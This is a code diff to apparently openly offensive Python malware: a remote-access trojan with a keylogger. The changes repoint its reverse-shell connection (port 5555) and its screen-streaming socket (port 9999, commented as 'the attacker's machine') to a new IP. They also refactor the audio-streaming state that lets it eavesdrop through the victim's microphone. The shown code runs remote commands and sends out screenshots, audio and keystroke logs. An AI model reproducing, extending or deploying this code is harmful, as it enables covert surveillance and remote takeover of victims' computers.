@@ -54,7 +54,7 @@ def connection():
         time.sleep(5)  # Wait for 5 seconds before reconnecting (for resilience)
         try:
             # Connect to a remote host with Listener IP and port 5555
-            s.connect(('192.168.210.143', 5555))
+            s.connect(('192.168.210.1', 5555))
             # Once connected, enter the shell() function for command execution
             shell()
             # Close the connection when done
@@ -135,7 +135,8 @@ def retrieve_keylogger_log():
     log = ""  # Clear the log after retrieving it
     return log_data
 
-  
+streaming_flag = {'on': False}
+stream_thread = None
 def stream_audio(sock, flag):
     CHUNK = 1024
     FORMAT = pyaudio.paInt16
@@ -171,7 +172,7 @@ def take_screenshot():
 def stream_screen():
     try: # Runs in a separate thread and continuously sends screenshots to the server
         stream_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Create a TCP socket.
-        stream_socket.connect(('192.168.210.143', 9999)) # Connect to the attacker's machine on port 9999 for streaming.
+        stream_socket.connect(('192.168.210.1', 9999)) # Connect to the attacker's machine on port 9999 for streaming.
         with mss.mss() as sct: # Open a screen capture session using mss
             while True: # Loop forever to take screenshots
                 screenshots = sct.grab(sct.monitors[1]) # Take a screenshot of the main monitor.
@@ -188,8 +189,7 @@ def stream_screen():
 
 # Main shell function for command execution
 def shell():
-    streaming_flag = {'on': False}
-    stream_thread = None
+    global stream_thread, streaming_flag
     while True:
         # Receive a command from the remote host
         command = reliable_recv()
@@ -225,12 +225,12 @@ def shell():
                 streaming_flag['on'] = True
                 stream_thread = threading.Thread(target=stream_audio, args=(s, streaming_flag))
                 stream_thread.start()
-            reliable_send("[*] Audio stream started.")
+            reliable_send("[+] Audio stream started.")
         elif command == 'listening_stop':
             streaming_flag['on'] = False
             if stream_thread:
                 stream_thread.join()
-            reliable_send("[*] Audio stream stopped.")
+            reliable_send("[+] Audio stream stopped.")
         elif command == 'screenshot':
             # If the command is 'screenshot', take a screenshot and send it
             screenshot_data = take_screenshot()
